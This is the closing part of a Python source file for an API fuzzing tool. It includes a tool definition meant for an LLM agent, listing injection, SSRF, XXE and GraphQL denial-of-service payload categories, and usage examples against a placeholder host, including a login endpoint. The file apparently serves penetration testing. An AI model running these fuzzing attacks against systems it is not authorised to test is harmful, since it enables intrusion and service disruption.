    # Critical findings
    critical = [
        r for r in all_results
        if r.severity in ("critical", "high") and r.interesting
    ]

    total_interesting = sum(1 for r in all_results if r.interesting)
    total_errors      = sum(1 for r in all_results if r.error_detected)

    # ══════════════════════════════
    # BUILD RESULT
    # ══════════════════════════════
    return APIFuzzingResult(
        success=len(all_results) > 0,
        tool=tool,
        target=target,
        command=command_str,
        total_requests=len(all_results),
        total_interesting=total_interesting,
        total_errors=total_errors,
        fuzz_results=all_results,
        param_summaries=param_summaries,
        method_results=method_results,
        content_type_results=content_type_results,
        critical_findings=critical,
        raw_output=raw_output[:5000] if raw_output else None,
        error=error_msg,
        execution_time=round(time.time() - start, 2),
        techniques_used=list(dict.fromkeys(techniques_used)),
    ).model_dump()


# ══════════════════════════════════════════════════════════════
# 9. TOOL DEFINITION (for LLM)
# ══════════════════════════════════════════════════════════════

API_FUZZING_TOOL_DEFINITION = {
    "name": "api_fuzzing",
    "description": (
        "Fuzz API endpoints for injection vulnerabilities, "
        "method confusion, content-type bypass, and payload injection. "
        "Payload categories: SQLi (30 payloads), XSS (20), SSTI (17), "
        "LFI/Path Traversal (18), CMDi (17), Buffer Overflow (19), "
        "SSRF (17), XXE (6), Open Redirect (11). "
        "Fuzz targets: URL params, body fields, path segments, HTTP headers. "
        "Method fuzzing: all 20 HTTP methods, detect PUT/DELETE on GET-only, "
        "TRACE/DEBUG, method override via headers. "
        "Content-type fuzzing: 20 types, detect bypass and XXE triggers. "
        "GraphQL: alias DoS, depth bomb, batch injection, field injection. "
        "Supports ffuf (wordlist), nuclei (templates), manual (all built-in)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "tool": {
                "type": "string",
                "enum": ["ffuf", "nuclei", "manual"],
                "description": (
                    "ffuf   = wordlist-based parameter fuzzing | "
                    "nuclei = template-based API fuzzing (DAST) | "
                    "manual = all techniques built-in (recommended)"
                ),
            },
            "target": {
                "type": "string",
                "description": "API base URL (e.g. 'https://api.example.com')",
            },
            "endpoints": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Specific endpoints to fuzz. "
                    "e.g. ['/api/v1/users', '/api/search', "
                    "'/api/v2/upload']"
                ),
            },
            "headers": {
                "type": "object",
                "description": (
                    "Custom headers (auth tokens, etc.). "
                    "e.g. {'Authorization': 'Bearer token', "
                    "'X-API-Key': 'key123'}"
                ),
            },
            "methods": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "HTTP methods to fuzz. "
                    "Default: GET, POST, PUT, DELETE, PATCH. "
                    "Add OPTIONS, TRACE, DEBUG for full coverage."
                ),
            },
            "params": {
                "type": "object",
                "description": (
                    "Baseline URL parameters to fuzz. "
                    "e.g. {'id': '1', 'user': 'admin', 'q': 'test'}"
                ),
            },
            "body": {
                "type": "string",
                "description": (
                    "Baseline request body to fuzz. "
                    "e.g. '{\"user\":\"admin\",\"id\":1}'"
                ),
            },
            "wordlist": {
                "type": "string",
                "description": (
                    "Wordlist or template path. "
                    "ffuf: '/wordlists/payloads.txt'. "
                    "nuclei: 'fuzzing/' or specific template path."
                ),
            },
            "args": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Raw tool arguments. Examples:\n"
                    "ffuf:   ['-rate', '100', '-t', '50', "
                    "'-fc', '404,400', '-recursion']\n"
                    "nuclei: ['-tags', 'fuzz', '-severity', "
                    "'medium,high,critical', '-rl', '30']\n"
                    "manual: [] (no args needed)"
                ),
            },
        },
        "required": ["tool", "target"],
    },
}


# ══════════════════════════════════════════════════════════════
# 10. USAGE EXAMPLES
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    # ─────────────────────────────
    # 1. Manual — full fuzz suite
    # ─────────────────────────────
    r = api_fuzzing(
        tool="manual",
        target="https://api.example.com",
        endpoints=["/api/v1/users", "/api/search", "/api/upload"],
        headers={"Authorization": "Bearer test_token"},
        params={"id": "1", "q": "test"},
    )
    print("=== MANUAL FULL FUZZ ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 2. Method fuzzing only
    # ─────────────────────────────
    r = api_fuzzing(
        tool="manual",
        target="https://api.example.com",
        endpoints=["/api/v1/users", "/api/v1/admin"],
        methods=["GET", "POST", "PUT", "DELETE", "PATCH",
                 "OPTIONS", "TRACE", "DEBUG", "HEAD"],
    )
    print("=== METHOD FUZZ ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 3. ffuf param fuzzing
    # ─────────────────────────────
    r = api_fuzzing(
        tool="ffuf",
        target="https://api.example.com",
        endpoints=["/api/search", "/api/users"],
        params={"q": "test", "id": "1"},
        args=["-rate", "100", "-t", "50", "-fc", "404,400"],
    )
    print("=== FFUF PARAM FUZZ ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 4. ffuf body fuzzing
    # ─────────────────────────────
    r = api_fuzzing(
        tool="ffuf",
        target="https://api.example.com",
        endpoints=["/api/v1/login", "/api/v1/search"],
        body='{"username":"FUZZ","password":"test"}',
        methods=["POST"],
        headers={"Content-Type": "application/json"},
    )
    print("=== FFUF BODY FUZZ ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 5. Nuclei API templates
    # ─────────────────────────────
    r = api_fuzzing(
        tool="nuclei",
        target="https://api.example.com",
        args=["-tags", "fuzz", "-severity", "medium,high,critical",
              "-rl", "30", "-c", "10"],
        headers={"Authorization": "Bearer token"},
    )
    print("=== NUCLEI FUZZ ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 6. SQLi focused
    # ─────────────────────────────
    r = api_fuzzing(
        tool="manual",
        target="https://api.example.com",
        endpoints=["/api/users", "/api/search", "/api/products"],
        params={"id": "1", "search": "test", "category": "all"},
        body='{"user_id": 1, "query": "test"}',
    )
    print("=== SQLI FOCUSED ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 7. GraphQL fuzzing
    # ─────────────────────────────
    r = api_fuzzing(
        tool="manual",
        target="https://api.example.com",
        endpoints=["/graphql", "/api/graphql"],
        headers={"Authorization": "Bearer token",
                 "Content-Type": "application/json"},
    )
    print("=== GRAPHQL FUZZ ===")
    print(json.dumps(r, indent=2))